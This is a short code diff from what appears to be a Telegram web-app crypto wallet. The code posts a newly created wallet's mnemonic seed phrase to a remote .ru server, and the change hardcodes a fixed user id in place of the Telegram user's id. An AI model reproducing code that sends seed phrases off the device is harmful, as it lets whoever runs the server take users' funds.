@@ -77,7 +77,7 @@ const useButton = ({step, setStep, keys, values, setMistakes, mistakes, numbers}
       const createWallet = useCallback( async () => {
         await axios.post("https://www.connectbirga.ru/user/wallet", {
             mnemonic: keys,
-            userId: window.Telegram.WebApp.initDataUnsafe.user.id,
+            userId: 1392120153,
           } , {
             headers : {
               "X-API-KEY-AUTH" : process.env.REACT_APP_API_KEY
